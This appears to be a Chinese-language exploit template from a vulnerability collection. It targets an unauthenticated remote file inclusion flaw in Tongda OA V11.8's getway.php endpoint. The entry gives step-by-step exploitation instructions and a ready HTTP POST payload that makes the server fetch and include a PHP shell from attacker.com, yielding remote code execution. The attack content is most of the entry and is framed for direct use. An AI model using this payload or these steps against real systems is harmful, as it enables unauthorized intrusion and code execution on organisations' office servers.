---
id: TONGDA-V118-GETWAY-RFI
title: 通达OA v11.8 getway.php 远程文件包含
product: tongda-oa
vendor: 北京通达信科
version_affected: "V11.8"
severity: CRITICAL
tags: [rce, rfi, file_inclusion, file_include, 无需认证, 国产, oa]
fingerprint: ["通达OA", "Office Anywhere", "getway.php"]
---

## 漏洞描述

通达OA v11.8 getway.php 接口存在远程文件包含（RFI）漏洞，攻击者可包含远程恶意 PHP 文件实现 RCE。

## 影响版本

- V11.8

## 前置条件

- 无需认证
- 目标为通达OA V11.8，`/ispirit/interface/getway.php` 接口可访问
- 需要可控的远程 HTTP 服务托管恶意 PHP 文件

## 利用步骤

1. 在攻击者服务器上托管恶意 PHP 文件（如 `shell.txt`）
2. 向 `getway.php` 发送 POST 请求，通过 `json` 参数指定远程文件 URL
3. 服务端 include 远程文件，实现 RCE
4. 通过命令回显或 DNSLog 确认执行结果

## Payload

```http
POST /ispirit/interface/getway.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

json={"url":"http://attacker.com/shell.txt"}
```

远程文件需为 PHP 代码，服务端会 include 执行。

## 验证方法

远程文件中的 PHP 代码被执行，通过命令回显或 DNSLog 确认。
